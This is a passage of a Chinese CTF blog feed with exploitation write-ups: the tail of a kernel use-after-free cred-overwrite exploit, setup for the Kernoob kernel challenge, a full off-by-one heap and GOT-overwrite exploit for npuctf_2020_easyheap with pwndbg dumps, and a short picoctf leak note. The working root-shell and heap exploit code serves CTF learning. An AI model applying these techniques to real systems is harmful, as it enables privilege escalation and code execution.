释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存</span></span><br><span class="line">    <span class="built_in">close</span>(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间将占用那一块已free的内存</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 篡改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">write</span>(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210606154209689.png" alt="image-20210606154209689"></p>
<h3 id="5-2020高校战疫分享赛-–-Kernoob"><a href="#5-2020高校战疫分享赛-–-Kernoob" class="headerlink" title="5.2020高校战疫分享赛 – Kernoob"></a>5.2020高校战疫分享赛 – Kernoob</h3><h4 id="下载文件-4"><a href="#下载文件-4" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="Kernoob.zip">附件</a>        <a href="https://adworld.xctf.org.cn/match/contest_challenge?event=134&amp;hash=a94cbc83-14c0-4de3-85f8-55ef6ed4361c.event" target="_blank" rel="noopener">链接</a></p>
<p>给了四个文件：bzImage、initramfs.cpio、noob.ko和startvm.sh</p>
<h4 id="预备-2"><a href="#预备-2" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压cpio的dc.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.cpio</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
</li>
<li><p>打包文件系统initramfs.cpio的ci.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
</li>
<li><p>程序基址</p>
<p>本程序没有lib文件夹</p>
<p>方法是<code>grep noob /proc/kallsyms</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~ $ grep noob /proc/kallsyms</span><br><span class="line">ffffffffc0002000 t copy_overflow	[noob]</span><br><span class="line">ffffffffc0003120 r kernel_read_file_str	[noob]</span><br><span class="line">ffffffffc0002043 t add_note	[noob]</span><br><span class="line">ffffffffc000211c t del_note	[noob]</span><br><span class="line">ffffffffc0002180 t show_note	[noob]</span><br><span class="line">ffffffffc00022d8 t edit_note	[noob]</span><br><span class="line">ffffffffc0002431 t noob_ioctl	[noob]</span><br><span class="line">ffffffffc0004000 d fops	[noob]</span><br><span class="line">ffffffffc0004100 d misc	[noob]</span><br><span class="line">ffffffffc0003078 r .LC1	[noob]</span><br><span class="line">ffffffffc00044c0 b pool	[noob]</span><br><span class="line">ffffffffc0004180 d __this_module	[noob]</span><br><span class="line">ffffffffc00024f2 t cleanup_module	[noob]</span><br><span class="line">ffffffffc00024ca t init_module	[noob]</span><br><span class="line">ffffffffc00024f2 t noob_exit	[noob]</span><br><span class="line">ffffffffc00024ca t noob_init	[noob]</span><br></pre></td></tr></table></figure>
<p>其中t、d、b开头的地址就是.text、.data和.bss的基地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture i386:x86-64:intel</span><br><span class="line">add-symbol-file noob.ko 0xffffffffc0002000 -s .data 0xffffffffc0004000 -s .bss 0xffffffffc00044C0</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anp |grep 1234</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
</li>
<li></li>
</ol>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><h5 id="init-1"><a href="#init-1" class="headerlink" title="init"></a>init</h5><p>这次init是空的，故该为查看<code>/etc/init.d/rcS</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo "Welcome :)"</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment">#直接在home下加载的模块</span></span><br><span class="line">insmod /home/pwn/noob.ko</span><br><span class="line">chmod 666 /dev/noob</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<h5 id="LKMs-1"><a href="#LKMs-1" class="headerlink" title="LKMs"></a>LKMs</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/kernoob$ file noob.ko </span><br><span class="line">noob.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=7bc6535b4946f6dd01729e9b31c36e400efc8479, not stripped</span><br><span class="line">winter@ubuntu:~/kernoob$ checksec noob.ko </span><br><span class="line">[*] '/home/winter/kernoob/noob.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>64位程序，只开启了NX</p>
]]></content>
      <categories>
        <category>专题</category>
      </categories>
      <tags>
        <tag>kernel pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>npuctf_2020_easyheap详解</title>
    <url>/2021/04/25/00-17/</url>
    <content><![CDATA[<blockquote>
<p>off by one的题，，，</p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV19K4y1v7tq?from=search&amp;seid=15178314990352817331" target="_blank" rel="noopener">off by one + 改got表的heap做法 例题：npuctf_2020_easyheap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>create：</p>
<p>申请两个chunk： 一个heaparray[i]（固定0x10大小），一个是申请的大小（只能申请0x18或0x38）</p>
</li>
<li><p>edit：</p>
<p><code>read_input(heaparray[(signed int)v1][1], *heaparray[(signed int)v1] + 1LL);</code></p>
<p>存在off by one</p>
</li>
<li><p>show：根据idx，打印chunk大小和内容</p>
</li>
<li><p>delete：free后，将chunk指针置零了。</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用off by one，可以修改下一个chunk头指针的大小。</p>
<p>例如，一开始可以申请两个0x18的块。当修改chunk0，溢出到chunk1的头指针大小为0x41，那么chunk1free后重新申请回来，chunk1的内容会和chunk1头指针重叠，可以修改chunk1的指针。</p>
<p>溢出修改chunk1指针为free_got表，泄露地址，计算system</p>
<p>修改chunk内容从而，修改got表内容为system</p>
<p>在chunk0中放入“/bin/sh\x00”，则free(0)即可=&gt;system(“/bin/sh\x00”)</p>
<h4 id="1-查看保护"><a href="#1-查看保护" class="headerlink" title="1.查看保护"></a>1.查看保护</h4><blockquote>
<p>Partial RELRO =&gt; 可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec npuctf_2020_easyheap</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;npuctf_2020_easyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h4 id="2-申请两个0x18的块"><a href="#2-申请两个0x18的块" class="headerlink" title="2.申请两个0x18的块"></a>2.申请两个0x18的块</h4><blockquote>
<p>一共生成了四个chunk，两个heaparray，两个存在内容</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">#chunk0 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk0 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560290</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1560250</span><br><span class="line">0x1560250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560260:	0x0000000000000018	0x0000000001560280</span><br><span class="line">0x1560270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560280:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1560290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602a0:	0x0000000000000018	0x00000000015602c0</span><br><span class="line">0x15602b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x15602d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x15602e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x15602f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-通过chunk0-off-by-one"><a href="#3-通过chunk0-off-by-one" class="headerlink" title="3.通过chunk0 off by one"></a>3.通过chunk0 off by one</h4><blockquote>
<p>修改chunk0的内容，首先放入接下来用的参数。</p>
<p>然后溢出一个字节，修改chunk1 heaparray的大小为0x41</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x13272d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1327250</span><br><span class="line">0x1327250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327260:	0x0000000000000018	0x0000000001327280</span><br><span class="line">0x1327270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327280:	0x0068732f6e69622f	0x0000000000000000	#&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">0x1327290:	0x0000000000000000	0x0000000000000041	#溢出一个字节</span><br><span class="line">0x13272a0:	0x0000000000000018	0x00000000013272c0</span><br><span class="line">0x13272b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x13272c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x13272d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x13272e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13272f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>存放所有的heaparay指针，有两个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x0000000000bf0260	0x0000000000bf02c0</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-释放chunk1"><a href="#4-释放chunk1" class="headerlink" title="4.释放chunk1"></a>4.释放chunk1</h4><blockquote>
<p>chunk1通过上面的全局变量，找到的地址还是不变，但是大小以及被修改为0x41，会按照0x41的大小被释放</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x21d9290</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x21d9250</span><br><span class="line">0x21d9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9260:	0x0000000000000018	0x00000000021d9280</span><br><span class="line">0x21d9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0x21d9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x21d92a0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d92c0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x21d92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x21d92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x00000000021d9260	0x0000000000000000		#另一个被清零了</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="5-重新申请0x38的块"><a href="#5-重新申请0x38的块" class="headerlink" title="5.重新申请0x38的块"></a>5.重新申请0x38的块</h4><blockquote>
<p>再次申请，会把之前释放的0x41和0x21重新申请回来。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">#找不到下一个，，，但是在</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf02d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<h4 id="6-通过0x41的块，溢出覆盖0x21的块"><a href="#6-通过0x41的块，溢出覆盖0x21的块" class="headerlink" title="6.通过0x41的块，溢出覆盖0x21的块"></a>6.通过0x41的块，溢出覆盖0x21的块</h4><blockquote>
<p>但是由于0x41的chunk与0x21的chunk重叠了，故可以通过0x41的chunk修改0x21的chunk</p>
<p>但是0x21的chunk存放的是chunk1的指针，故可以让chunk1指针指向free got表，达到泄露。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbf0250</span><br><span class="line">0xbf0250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0260:	0x0000000000000018	0x0000000000bf0280</span><br><span class="line">0xbf0270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbf0290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbf02a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02c0:	0x0000000000000038	0x0000000000602018#free_got</span><br><span class="line">0xbf02d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbf02e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbf02f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x15d bytes:</span><br><span class="line">    00000000  53 69 7a 65  20 3a 20 35  36 0a 43 6f  6e 74 65 6e  │Size│ : 5│6·Co│nten│</span><br><span class="line">    00000010  74 20 3a 20  30 ba fd 89  0a 7f 0a 44  6f 6e 65 21  │t : │0···│···D│one!│</span><br><span class="line">    #泄露到了free的地址</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)</span><br></pre></td></tr></table></figure>
<h4 id="7-修改free-got表为system地址"><a href="#7-修改free-got表为system地址" class="headerlink" title="7.修改free_got表为system地址"></a>7.修改free_got表为system地址</h4><blockquote>
<p>此时chunk1的指针指向free_got，故修改chunk1的内容，就可以修改free_got表内容，修改为system地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbb9250</span><br><span class="line">0xbb9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9260:	0x0000000000000018	0x0000000000bb9280</span><br><span class="line">0xbb9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbb9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbb92a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92c0:	0x0000000000000038	0x0000000000602018#chunk1指针-&gt;free_got-&gt;system</span><br><span class="line">0xbb92d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbb92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbb92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018:	0x00007fcb5dae9550	0x000000000040060a</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fcb5dae9550</span><br><span class="line">0x7fcb5dae9550 &lt;__libc_system&gt;:	0xfa66e90b74ff8548	0x0000441f0f66ffff</span><br></pre></td></tr></table></figure>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./npuctf_2020_easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29535</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./npuctf_2020_easyheap"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(['./npuctf_2020_easyheap'],env=&#123;"LD_PRELOAD":"./libc-2.27.so"&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"only) :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x38</span>) + p64(free_got)</span><br><span class="line">create(<span class="number">0x38</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><p>特点：</p>
<ol>
<li>可以修改got表</li>
<li>malloc两次：一个node，一个content</li>
</ol>
<p>方法：</p>
<ol>
<li>利用node和本体互换 =&gt; 泄露libc</li>
<li>修改free_got=&gt;system</li>
</ol>
<blockquote>
<p>off by one题挺多，多练习，this is the first。</p>
</blockquote>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>off by one</tag>
      </tags>
  </entry>
  <entry>
    <title>picoctf_2018_leak_me详解</title>
    <url>/2021/05/01/23-54/</url>
    <content><![CDATA[<blockquote>
<p>虽然很简单，<del>但好像第一次碰见这样的题</del>，所以记录下。</p>
</blockquote>
<h3 id="反汇编问题"><a href="#反汇编问题" class="headerlink" title="反汇编问题"></a>反汇编问题</h3><p>问题：main函数f5的时候报如下错误</p>
<p><img src="/2021/05/01/23-54/image-20210501234336628.png" alt="image-20210501234336628"></p>
<p>解决：</p>
<ol>
<li><p>找到报错的地址：0x8048705【按g输入地址即可】</p>
<p><img src="/2021/05/01/23-54/image-20210501234523311.png" alt="image-20210501234523311"></p>
</li>
<li><p>双击函数，然后f5</p>
<p><img src="/2021/05/01/23-54/image-20210501234614572.png" alt="image-20210501234614572"></p>
</li>
<li><p>然后就可以正常了</p>
</li>
</ol>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name</li>
<li>打印name</li>
<li>输入password</li>
<li>比较输入password和password</li>
<li>相同打印flag</li>
</ol>
<p><img src="/2021/05/01/23-54/image-20210501234815805.png" alt="image-20210501234815805"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于name和password是紧挨着的，而且差距0x100。</p>
<p>如果name的长度为0x100，那么puts输出name的时候，就会把password一起带出来了。</p>
<p>而且name的最大长度可以达到0x100，故首先令name=0x100，即可泄露password，接着就可以得到flag了。</p>
<p><img src="/2021/05/01/23-54/image-20210501234915134.png" alt="image-20210501234915134"></p>
